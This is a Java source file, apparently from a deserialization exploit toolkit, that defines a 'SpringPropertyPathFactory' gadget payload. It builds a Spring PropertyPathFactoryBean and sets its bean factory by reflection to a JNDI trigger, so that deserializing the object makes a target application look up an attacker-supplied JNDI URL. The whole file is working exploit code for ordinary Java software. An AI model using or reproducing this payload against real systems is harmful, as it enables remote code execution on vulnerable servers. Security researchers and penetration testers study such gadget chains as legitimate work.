package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;

public class SpringPropertyPathFactory implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String jndiUrl = command;
        BeanFactory bf = SpringUtil.makeJNDITrigger(jndiUrl);

        PropertyPathFactoryBean ppf = new PropertyPathFactoryBean();
        ppf.setTargetBeanName(jndiUrl);
        ppf.setPropertyPath("foo");

        Reflections.setFieldValue(ppf, "beanFactory", bf);
        return ppf;
    }
}
